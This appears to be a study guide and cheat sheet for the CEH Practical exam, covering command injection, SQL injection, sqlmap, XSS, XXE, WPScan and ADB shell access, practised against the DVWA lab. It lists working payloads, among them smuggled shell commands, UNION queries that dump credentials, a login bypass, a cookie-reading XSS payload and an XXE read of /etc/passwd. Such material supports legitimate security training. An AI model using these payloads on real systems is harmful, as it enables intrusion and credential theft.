Hacking Web & Android Applications 🚨

“Understand how applications break, so you learn how to secure them.”

📚 What You’ll Learn

By the end of this module, you’ll clearly understand and practice:

💉 Command Injection

🧠 SQL Injection (SQLi)

🧪 Cross-Site Scripting (XSS)

🤖 Android Application Hacking

🧩 XXE (XML External Entity Injection)

🛠️ Tools We’ll Use
Tool	Purpose
DVWA	Practice vulnerable web applications
SQLMap	Automate SQL Injection attacks
Burp Suite	Intercept & analyze HTTP requests
WPScan	Scan WordPress websites
ADB	Interact with Android devices
⚙️ Command Injection
📌 What is Command Injection?

When user input is passed directly to the system shell without validation, allowing attackers to execute OS commands.

🔬 Practical Demo (DVWA)

Login to DVWA

Set Security Level → Low

Go to Command Injection

Enter an IP:

8.8.8.8


✔️ Output shows ping result

➡️ This proves that whatever we input is executed in the backend OS

🧨 Command Injection Payloads

Pipe commands like in terminal:

8.8.8.8 | pwd


📌 This tells us the current directory of the server

💉 SQL Injection (SQLi)
🔍 SELECT Queries (Data Extraction)
SELECT * FROM users;
SELECT username, password FROM users;
SELECT * FROM users LIMIT 1;
SELECT * FROM users WHERE username='admin';
SELECT * FROM users WHERE username!='admin';
SELECT * FROM users WHERE username='admin' OR username='jon';
SELECT * FROM users WHERE username='admin' AND password='p4ssword';

🔎 Pattern Matching
SELECT * FROM users WHERE username LIKE 'a%';
SELECT * FROM users WHERE username LIKE '%n';
SELECT * FROM users WHERE username LIKE '%mi%';

🔗 UNION Based SQL Injection
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3
0 UNION SELECT 1,2,database()

🗂️ Extracting Table Names
0 UNION SELECT 1,2,
group_concat(table_name)
FROM information_schema.tables
WHERE table_schema='sqli_one';


📌 group_concat() merges multiple rows into one readable string

🧱 Extracting Column Names
0 UNION SELECT 1,2,
group_concat(column_name)
FROM information_schema.columns
WHERE table_name='staff_users';

🔑 Dumping Credentials
0 UNION SELECT 1,2,
group_concat(username,':',password SEPARATOR '<br>')
FROM staff_users;

🔓 Login Bypass Payload
' OR 1=1;-- 


✔️ 1=1 is always true
✔️ OR makes authentication succeed
✔️ -- comments out the rest of the query

🤖 SQLMap (Automated SQLi)
🔍 Help Menu
sqlmap -h

🌐 GET Method
sqlmap --url http://target.com/page.php?id=1 --dbs

📡 POST Method (Using Burp Suite)

Intercept request in Burp Suite

Save request as req.txt

Run:

sqlmap -r req.txt --dbs

📂 Enumerate Tables & Columns
sqlmap -r req.txt -D dvwa --tables
sqlmap -r req.txt -D dvwa --columns

💾 Dump Database
sqlmap -r req.txt -D dvwa --dump

🕷️ WPScan (WordPress Scanning)
wpscan -h
wpscan --url http://10.10.14.187/ --enumerate u


📌 Used to enumerate:

Users

Plugins

Themes

Vulnerabilities

📱 Android Hacking (ADB)
📌 What is ADB?

Android Debug Bridge connects Android devices to your PC.

🔗 Connect to Android Device
adb connect <IP>:5555
adb devices

🐚 Android Shell Access
adb shell
ls
whoami
cd sdcard/
find secret
cat secret.txt


✔️ Used in CEH Practical Exam to capture flags

🧪 DVWA Installation (Docker)
sudo apt install docker.io
docker run --rm -it -p 80:80 vulnerables/web-dvwa


🌐 Open browser:

http://localhost

🧩 XXE – XML External Entity Injection
🔹 Basic Entity Example
<!DOCTYPE replace [
<!ENTITY name "feast">
]>
<userInfo>
 <firstName>falcon</firstName>
 <lastName>&name;</lastName>
</userInfo>

📂 File Disclosure via XXE
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY read SYSTEM "file:///etc/passwd">
]>
<root>&read;</root>


📌 Reads system files if XXE is enabled

⚠️ Why XXE Sometimes Fails?

File permissions

XML parser restrictions

Secure configuration

🎯 Exam Tips (CEH Practical)

✅ Practice DVWA + SQLMap + Burp
✅ Remember ADB commands
✅ Focus on logic, not memorization
✅ Understand why payload works




🔥 CEH Practical Exam – Ultimate Cheatsheet

(Web & Android Application Hacking)

🧠 HOW TO USE THIS IN EXAM

Read the question

Identify the attack type

Jump to that section

Apply payload → tool → dump → flag

1️⃣ COMMAND INJECTION
🔍 Detection Payloads
8.8.8.8
127.0.0.1

🚨 Exploitation Payloads
8.8.8.8 | whoami
8.8.8.8 | pwd
8.8.8.8 && ls
8.8.8.8 ; id


📌 Logic: Input is executed directly by OS shell

2️⃣ SQL INJECTION (MANUAL)
🔎 Detection
'
"
' OR '1'='1

🔓 Login Bypass
' OR 1=1-- 
' OR 'a'='a'-- 

🔗 UNION Column Count
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3


✔️ Stop when page loads normally

🗂️ Database Enumeration
database()

0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema='dvwa';

🧱 Column Enumeration
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name='users';

🔑 Dump Credentials
0 UNION SELECT 1,2,
group_concat(user,':',password SEPARATOR '<br>')
FROM users;

3️⃣ SQLMAP (AUTOMATED – HIGH SCORE)
🔍 Help
sqlmap -h

🌐 GET Method
sqlmap --url http://target/page.php?id=1 --dbs

📡 POST Method (Burp Suite)
sqlmap -r req.txt --dbs

📂 Tables & Columns
sqlmap -r req.txt -D dvwa --tables
sqlmap -r req.txt -D dvwa --columns

💾 Dump Data
sqlmap -r req.txt -D dvwa --dump


📌 Exam Rule:
❌ URL not working → ✔️ use -r req.txt

4️⃣ XSS (QUICK MARKS)
🧪 Payloads
<script>alert(1)</script>

<img src=x onerror=alert(1)>


✔️ Alert popup = vulnerable

5️⃣ XXE (XML EXTERNAL ENTITY)
🔹 Basic Entity
<!DOCTYPE test [
<!ENTITY x "test">
]>
<root>&x;</root>

📂 File Read Payload
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY read SYSTEM "file:///etc/passwd">
]>
<root>&read;</root>


📌 Try also:

file:///proc/version

6️⃣ WPSCAN (WORDPRESS)
wpscan --url http://IP

wpscan --url http://IP --enumerate u


📌 Finds:

Users

Plugins

Vulnerabilities

7️⃣ ANDROID HACKING (ADB)
🔗 Connect
adb connect IP:5555
adb devices

🐚 Shell Access
adb shell
ls
whoami
cd sdcard/
find .
cat secret.txt


📌 Exam Pattern: flag in .txt file

8️⃣ DVWA INSTALL (FAST)
sudo apt install docker.io
docker run --rm -it -p 80:80 vulnerables/web-dvwa


🌐 Open:

http://localhost


Set security → LOW

🎯 CEH PRACTICAL GOLDEN TIPS

✔️ Enumeration > Exploitation
✔️ Manual first, SQLMap second
✔️ Burp for POST requests
✔️ Flags usually plain text
✔️ Don’t overthink payloads

 WIKI STRUCTURE (RECOMMENDED)
Home
├── Command Injection
├── SQL Injection
├── SQLMap
├── XSS
├── XXE
├── WPScan
├── Android (ADB)
============================================================================================

🔴 STORED XSS PRACTICAL
5️⃣ Open XSS (Stored)
DVWA → XSS (Stored)

6️⃣ Inject Payload in Comment Box
<script>alert('Stored XSS')</script>


Submit the form.

✅ Output:

Alert pops up

Reload page → alert again

📌 Stored permanently in database

CEH Key Point:

Stored XSS affects all users viewing the page.

🔴 DOM-BASED XSS (Quick)
7️⃣ DOM Payload
<script>document.write(document.location)</script>


📌 Happens in browser, not server.

🔹 ADVANCED PAYLOADS (EXAM USEFUL)
Purpose	Payload
Alert	<script>alert(1)</script>
Cookie theft	<script>alert(document.cookie)</script>
HTML injection	<h1>Hacked</h1>
Image-based	<img src=x onerror=alert(1)>
🔹 HOW TO CONFIRM XSS (Exam Logic)

Input reflected back?

JavaScript executed?

Alert box visible?

✔️ If YES → XSS confirmed

🔹 IMPACT OF XSS (CEH THEORY)

Session hijacking

Cookie theft

Keylogging

Phishing

Website defacement

🔹 HOW TO PREVENT XSS (CEH MUST)

Input validation

Output encoding

Content Security Policy (CSP)

HttpOnly cookies
